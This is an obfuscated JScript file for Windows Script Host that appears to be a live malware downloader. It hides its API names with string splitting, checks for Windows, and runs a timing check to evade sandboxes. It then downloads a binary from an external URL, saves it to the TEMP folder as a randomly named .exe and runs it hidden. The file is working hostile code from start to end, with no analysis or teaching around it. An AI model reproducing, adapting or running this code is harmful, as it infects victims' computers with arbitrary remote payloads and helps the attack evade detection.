var WL = false;
var L = "Create"+"Object";
var D = function OI() {return WScript[L]("WScript"+".Shell");}(), ZL = 11;
var PL = "MSXML2"+".XMLHTTP";
var W0 = 2;
var Y = W0 - 2;
function C0(U){D["Run"](U, Y, Y);};
function JC(){return PL + "";};
function V(D0, CM){Y = Y * 1; return D0 - CM;};
function DU(){return L;};
/*@cc_on
  @if (@_win32 || @_win64)
    WL = true;
  @end
@*/
if (WL)
{
var XK = "";
function WU(){return 22;};
var WV = 0; var H = 0;
function EK()
{
var R = new this["Date"]();
var FV = R["getUTCMilliseconds"]();
WScript["Sleep"](WU());
var R = new this["Date"]();
var P = R["getUTCMilliseconds"]();
WScript["Sleep"](WU());
var R = new this["Date"]();
var BG = R["getUTCMilliseconds"]();
var WV = "J1";
WV = V(P, FV);
var H = "X";
H = V(BG, P);
XK = "open";
return V(WV, H);
}
var X0 = false;
var C1 = false;
for (var BF = Y; BF < WU() * 1; BF++){if (EK() != Y){
X0 = true; 
H = "31" + 11 * WV + H; 
C1 = true; 
break;
}}
function C() {return ((X0 == true) && (X0 == C1)) ? 1 : Y;};
if (X0 && C() && C1){
function F() {return D["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "dK4Jv0dImOhoSAcg.ex" + "e";};
 V0 = JC();
 Y0 = WScript[L](V0);
 var J0 = 1;
do { 
	for (;J0;){
	try {
		if (J0 == 1)
		{
			Y0[XK]("GET", "http://aaacollectionsjewelry.com/x9djsa", false);
			Y0["send"]();
			SC = "Sleep";
			J0 = 2;
		}
		WScript[SC](WU() + 120); 
		if (Y0["readystate"] < 2 * 2) continue;
		J0 = Y;
		function Q(J) {var L0 = (1, 2, 3, 4, 5, J); return L0;};
		E = WScript[DU()]("ADODB.Stream");
		V0 = E;
		V0[XK]();
		V0["type"] = Q(1);
		V0["write"](Y0["ResponseBody"]);
		E["position"] = Q(Y);
		V0["Save" + "ToFile"](F(), 2);
		E["cl"+"ose"]();
		W = F();
		C0(W);
	} catch(Q0){};};
}while (J0);
}
}

